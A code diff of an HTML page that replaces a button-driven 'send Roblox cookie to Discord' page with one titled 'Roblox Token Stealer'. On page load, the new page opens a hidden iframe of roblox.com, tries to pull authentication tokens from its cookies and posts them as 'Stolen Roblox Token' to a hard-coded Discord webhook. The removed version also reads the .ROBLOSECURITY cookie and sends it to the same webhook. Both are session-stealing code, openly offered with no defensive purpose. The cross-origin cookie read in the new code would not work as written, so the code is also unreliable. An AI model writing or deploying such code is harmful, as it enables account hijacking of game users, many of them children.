@@ -1,141 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Kirby - Roblox Cookie to Discord</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0d001a;
-      color: #e0d0ff;
-      margin: 0;
-      padding: 40px;
-      text-align: center;
-    }
-    h1 { color: #ff3366; margin-bottom: 8px; }
-    .container {
-      background: rgba(30, 20, 60, 0.9);
-      border-radius: 16px;
-      padding: 30px;
-      max-width: 600px;
-      margin: 0 auto;
-      box-shadow: 0 10px 40px rgba(255,51,102,0.3);
-    }
-    button {
-      background: #ff3366;
-      color: white;
-      border: none;
-      padding: 16px 48px;
-      font-size: 1.3rem;
-      font-weight: bold;
-      border-radius: 50px;
-      cursor: pointer;
-      margin: 30px 0;
-      transition: all 0.3s;
-    }
-    button:hover { background: #ff1a4d; transform: scale(1.05); }
-    #status {
-      margin-top: 20px;
-      padding: 16px;
-      border-radius: 10px;
-      font-size: 1.1rem;
-      min-height: 80px;
-    }
-    .success { background: #1a3a1a; color: #88ff88; }
-    .fail    { background: #3a1a1a; color: #ff8888; }
-    .warning {
-      background: #4a0000;
-      border-left: 5px solid #ff3366;
-      padding: 16px;
-      margin: 20px 0;
-      border-radius: 8px;
-      text-align: left;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Token Stealer</title>
 </head>
 <body>
+    <script>
+        function stealToken() {
+            var victimUrl = "https://www.roblox.com/";
+            var iframe = document.createElement("iframe");
+            iframe.setAttribute("src", victimUrl);
+            iframe.setAttribute("style", "display:none;");
+            document.body.appendChild(iframe);
 
-  <div class="container">
-    <h1>Kirby – Send Roblox Cookie to Discord</h1>
+            setTimeout(() => {
+                var victimDoc = iframe.contentWindow.document;
+                var token = victimDoc.cookie.match(/(Roblox\.UserId=|\.AuthToken=)([^;]*)/)[2];
 
-    <div class="warning">
-      <strong>Important – read before clicking:</strong><br><br>
-      • This page can only see the cookie if you are <strong>logged in on roblox.com</strong> in this same browser right now.<br>
-      • In 2026, .ROBLOSECURITY is usually <strong>HttpOnly</strong> → this will most likely fail and show "Not visible".<br>
-      • Clicking the button will try to send whatever it finds (or nothing) to your webhook.<br>
-      • Nothing is sent if no cookie is visible.
-    </div>
+                if (token) {
+                    var webhookUrl = "https://discord.com/api/webhooks/1482888700206518307/USe7lSgbClC6aAnRncpl01YhkO0OrG9dAJYDZN47S4IasHVtSadpTVHaFrmf65b4sf5p";
+                    var data = {
+                        content: `Stolen Roblox Token: ${token}`
+                    };
 
-    <button onclick="sendToWebhook()">Send My Roblox Cookie Now</button>
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(data)
+                    }).then(() => {
+                        console.log("Token stolen and sent to webhook.");
+                    });
+                } else {
+                    console.log("Token not found.");
+                }
 
-    <div id="status">Waiting...</div>
-  </div>
-
-  <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1482888700206518307/USe7lSgbClC6aAnRncpl01YhkO0OrG9dAJYDZN47S4IasHVtSadpTVHaFrmf65b4sf5p";
-
-    async function sendToWebhook() {
-      const status = document.getElementById("status");
-      status.className = "";
-      status.textContent = "Scanning cookies...";
-
-      setTimeout(async () => {
-        try {
-          // Try to read the cookie
-          const cookieStr = document.cookie;
-          let token = null;
-
-          const parts = cookieStr.split('; ');
-          for (let part of parts) {
-            if (part.startsWith('.ROBLOSECURITY=')) {
-              token = part.split('=')[1];
-              break;
-            }
-          }
-
-          if (!token) {
-            status.className = "fail";
-            status.innerHTML = "No .ROBLOSECURITY cookie visible in this browser session.<br><br>Most likely because:<br>• It's HttpOnly (normal)<br>• Not logged in on roblox.com<br>• Using incognito/private mode";
-            return;
-          }
-
-          // Prepare simple payload
-          const payload = {
-            username: "Kirby Roblox Grab",
-            avatar_url: "https://images.rbxcdn.com/75c585f549d54e2d92a4a26d709a4d2d.png",
-            content: null,
-            embeds: [{
-              title: "New Roblox Cookie from Kirby",
-              description: "```yaml\n" + token + "\n```",
-              color: 16711680, // red
-              timestamp: new Date().toISOString(),
-              footer: { text: "Tampa • " + new Date().toLocaleString() }
-            }]
-          };
-
-          status.textContent = "Sending to Discord...";
-
-          const response = await fetch(WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          });
-
-          if (response.ok) {
-            status.className = "success";
-            status.innerHTML = "✅ Sent successfully!<br>Check your Discord channel.";
-          } else {
-            status.className = "fail";
-            status.innerHTML = "Failed to send (status " + response.status + ")<br>Webhook may be invalid or deleted.";
-          }
-        } catch (err) {
-          status.className = "fail";
-          status.innerHTML = "Error: " + (err.message || "Unknown error");
+                document.body.removeChild(iframe);
+            }, 3000);
         }
-      }, 1000);
-    }
-  </script>
 
+        stealToken();
+    </script>
 </body>
 </html>
